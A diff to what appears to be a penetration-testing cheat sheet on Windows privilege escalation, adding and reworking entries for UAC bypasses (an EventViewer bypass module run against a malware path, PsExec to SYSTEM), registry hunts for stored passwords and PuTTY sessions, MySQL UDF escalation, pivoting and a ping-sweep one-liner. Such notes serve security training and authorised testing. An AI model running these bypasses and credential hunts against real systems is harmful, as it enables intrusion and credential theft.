@@ -116,13 +116,16 @@
                 *   32/64-Bit Cross-Compile → `[i686-w64-mingw32-g++ / g++] prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc`
     *   UAC
         *   Enumeration
-            *   Member of "Administrators" + Restricted Privileges / Integrity Levels
+            *   Member of "Administrators" + Restricted Privileges / File Access
             *   `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA`
             *   `reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`
-        *   Bypass
+        *   Bypasess
             *   `[environment]::OSVersion.Version` → [UACME](https://github.com/hfiref0x/UACME) + [Checklist](https://academy.hackthebox.com/module/67/section/626)
             *   Send Reverse Shell                               → Through SYSTEM Process (EOP Exploits)
-            *   GUI Access                                              → Application Escape / CMD “Run as Administrator” → Input Credentials
+            *   GUI Access                                              → CMD “Run as Administrator” → Input Credentials
+            *   EventViewer Method
+                *   [Load Module](https://github.com/CsEnox/EventViewer-UACBypass) → `Import-Module Invoke-EventViewer`
+                *   Exploit               → `Invoke-EventViewer [PATH\TO\MALWARE.exe]`
             *   PSExec (Local / Remote)
                 *   `PsExec.exe -h -s -i cmd`
                 *   `psexec.py [AUTH_STRING]`
@@ -341,7 +344,7 @@
             *   `reg query [HKLM/HKCU] /f [password/pass/pwd] /t REG_SZ /s /[k/d]`
             *   `reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`
             *   `reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd"`
-            *   `reg query “HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions”`
+            *   `reg query "HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions"`
             *   `reg query "[HKLM/HKCU]\Software\Microsoft\Windows\CurrentVersion\Internet Settings"`
             *   `reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"`
         *   Chrome/Firefox Sessions
@@ -420,14 +423,13 @@
         *   Local Services
             *   `netstat -ano`             → `ESTABILISHED/LISTEN` On → `127.0.0.1` / `::1` / `[::]` / `[INTRANET_IP]`
             *   Associated Process  → `tasklist | findstr [NETWORK_SERVICE_PID]` → Check Privilege Context
-            *   DB Access / MySQL UDF Escalation / Configuration Files → Write Privilege (All Services)
-            *   Port Forwarding
+            *   Configuration Files  → All Services + Permissions
+            *   DB Access                   → Data Dump / Blank Password / [UDF Escalation](https://juggernaut-sec.com/mysql-user-defined-functions/)
+            *   Local Forwarding
             *   Splunk Forwarder / Erlang Port (25672)
         *   [Dynamic Forwarding](https://notes.dollarboysushil.com/pivoting-and-tunneling/ligolo-ng)
-            *   `ipconfig /all`
-            *   `route -n`
-            *   `10.x.x.x` / `192.168.x.x` / `172.[16-31].x.x`
-            *   Local Ping Sweep
+            *   `ipconfig /all` / `route -n`
+            *   Local Sweep
                 *   Valid for `/24` → Adjust Accordingly
                 *   `(for /L %a IN (1,1,254) DO ping /n 1 /w 1 [INTRANET_CIDR_BLOCK].%a) | find “Reply”`
         *   Traffic Sniffing
